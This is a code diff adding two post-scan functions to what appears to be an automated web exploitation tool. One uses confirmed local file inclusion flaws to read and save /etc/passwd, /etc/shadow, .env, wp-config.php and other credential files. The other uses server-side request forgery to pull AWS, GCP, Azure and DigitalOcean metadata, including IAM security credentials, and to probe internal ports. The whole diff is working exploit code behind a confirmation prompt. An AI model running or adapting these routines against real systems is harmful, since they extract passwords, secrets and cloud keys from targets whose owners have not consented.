@@ -469,6 +469,158 @@ def _run_autopwn_postprocess(state):
     return []
 
 
+def _run_lfi_postprocess(state):
+    """Auto-exploit confirmed LFI vulns: read sensitive files, save via LootManager."""
+    from utils.colors import Colors, log_info, log_success, log_warning
+    from utils.loot_manager import LootManager
+    from utils.request import smart_request
+
+    options = state.get("options", {})
+    if not options.get("exploit"):
+        return []
+
+    lfi_vulns = [v for v in state.get("all_vulns", []) if "LFI" in v.get("type", "")]
+    if not lfi_vulns:
+        return []
+
+    print(
+        f"\n{Colors.BOLD}{Colors.CYAN}"
+        f"[?] {len(lfi_vulns)} LFI vuln(s) found. Auto-read sensitive files? (y/N)"
+        f"{Colors.END}"
+    )
+    choice = state["prompt_input"]("Choice:", "N").lower()
+    if choice != "y":
+        return []
+
+    scan_dir = state.get("scan_dir", "/tmp")
+    loot = LootManager(scan_dir)
+
+    # Files to try reading via confirmed LFI
+    sensitive_files = [
+        "/etc/passwd",
+        "/etc/shadow",
+        "../../../../.env",
+        "../../../../wp-config.php",
+        "/proc/self/environ",
+        "/etc/hosts",
+        "../../../../config/database.yml",
+    ]
+
+    for vuln in lfi_vulns:
+        url = vuln.get("url", "")
+        param = vuln.get("param", "")
+
+        if not url or not param:
+            continue
+
+        log_info(f"LFI exploit on {param}@{url[:60]}...")
+
+        for target_file in sensitive_files:
+            try:
+                # Build the exploit payload using the same traversal pattern
+                from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+                parsed = urlparse(url)
+                params = parse_qs(parsed.query, keep_blank_values=True)
+                params[param] = [target_file]
+                flat = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
+                test_url = urlunparse(parsed._replace(query=urlencode(flat)))
+
+                resp = smart_request("get", test_url, delay=0.5)
+                if resp and resp.status_code == 200:
+                    body = resp.text
+                    # Check if file content is actually present
+                    if target_file == "/etc/passwd" and "root:" in body:
+                        loot.save_file_download("/etc/passwd", body)
+                        log_success(f"  📄 /etc/passwd extracted!")
+                    elif ".env" in target_file and ("DB_PASSWORD" in body or "APP_KEY" in body):
+                        loot.save_file_download(".env", body)
+                        log_success(f"  📄 .env file extracted!")
+                    elif "wp-config" in target_file and "DB_NAME" in body:
+                        loot.save_file_download("wp-config.php", body)
+                        log_success(f"  📄 wp-config.php extracted!")
+                    elif "root:" in body or "DB_" in body or "define(" in body:
+                        basename = target_file.split("/")[-1] or "unknown"
+                        loot.save_file_download(basename, body)
+                        log_success(f"  📄 {target_file} extracted!")
+            except Exception as e:
+                log_warning(f"  LFI read failed for {target_file}: {e}")
+
+    loot.summary()
+    return []
+
+
+def _run_ssrf_postprocess(state):
+    """Auto-exploit confirmed SSRF vulns: probe cloud metadata endpoints."""
+    from utils.colors import Colors, log_info, log_success, log_warning
+    from utils.loot_manager import LootManager
+    from utils.request import smart_request
+
+    options = state.get("options", {})
+    if not options.get("exploit"):
+        return []
+
+    ssrf_vulns = [v for v in state.get("all_vulns", []) if "SSRF" in v.get("type", "")]
+    if not ssrf_vulns:
+        return []
+
+    print(
+        f"\n{Colors.BOLD}{Colors.CYAN}"
+        f"[?] {len(ssrf_vulns)} SSRF vuln(s) found. Probe cloud metadata? (y/N)"
+        f"{Colors.END}"
+    )
+    choice = state["prompt_input"]("Choice:", "N").lower()
+    if choice != "y":
+        return []
+
+    scan_dir = state.get("scan_dir", "/tmp")
+    loot = LootManager(scan_dir)
+
+    # Cloud metadata endpoints to probe via SSRF
+    metadata_targets = [
+        ("AWS", "http://169.254.169.254/latest/meta-data/"),
+        ("AWS IAM", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+        ("AWS Token", "http://169.254.169.254/latest/api/token"),
+        ("GCP", "http://metadata.google.internal/computeMetadata/v1/"),
+        ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
+        ("DigitalOcean", "http://169.254.169.254/metadata/v1/"),
+        ("Internal", "http://127.0.0.1:80/"),
+        ("Internal:8080", "http://127.0.0.1:8080/"),
+    ]
+
+    for vuln in ssrf_vulns:
+        url = vuln.get("url", "")
+        param = vuln.get("param", "")
+        if not url or not param:
+            continue
+
+        log_info(f"SSRF cloud metadata probe on {param}@{url[:60]}...")
+
+        for cloud_name, metadata_url in metadata_targets:
+            try:
+                from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+                parsed = urlparse(url)
+                params = parse_qs(parsed.query, keep_blank_values=True)
+                params[param] = [metadata_url]
+                flat = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
+                test_url = urlunparse(parsed._replace(query=urlencode(flat)))
+
+                resp = smart_request("get", test_url, delay=0.5)
+                if resp and resp.status_code == 200 and len(resp.text) > 20:
+                    # Check for cloud-specific content
+                    body = resp.text
+                    if any(kw in body.lower() for kw in [
+                        "ami-id", "instance-id", "iam", "security-credentials",
+                        "computeMetadata", "metadata", "droplet_id",
+                    ]):
+                        loot.save_file_download(f"ssrf_{cloud_name.lower()}_metadata.txt", body)
+                        log_success(f"  ☁️ {cloud_name} metadata extracted!")
+            except Exception as e:
+                log_warning(f"  SSRF probe failed for {cloud_name}: {e}")
+
+    loot.summary()
+    return []
+
+
 # ── Post-scan runners ───────────────────────────────────────────────────────
 
 def _run_open_redirect(state):
